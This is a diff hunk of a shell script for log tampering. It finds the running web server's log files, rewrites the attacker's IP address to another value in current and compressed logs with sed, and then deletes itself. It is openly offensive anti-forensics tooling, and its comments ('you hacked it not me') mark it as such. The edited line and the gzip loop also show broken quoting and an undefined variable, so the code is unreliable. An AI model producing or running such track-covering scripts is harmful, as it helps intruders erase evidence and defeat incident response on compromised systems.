@@ -22,7 +22,7 @@ esac
 echo "Searching for attacker IP: $ip target machine: $os "
 web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" ### if listening port is default everything will be ok, else change it you hacked it not me .
 for line in "`lsof 2>/dev/null| grep $web_srv | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'`";do 
-[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) && mv /tmp/$(basename $line)  $line
+[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) && mv /tmp/$(basename $line)  $line.$(basename $zp)
 [ -f "$line.*.$zip_type" ]&& echo "old compressed logs found ! " && for zp in  $(ls $line.*.$zip_type) ;do 	
 gzip -cdk $zp | sed 's/'$ip'/'$replace'/g' | gzip >/tmp/$(basename $zp)" ;echo " mv /tmp/$(basename $zp) $line.$(basename $zp) ;done || echo "no such compressed log were found ";done
 rm $0
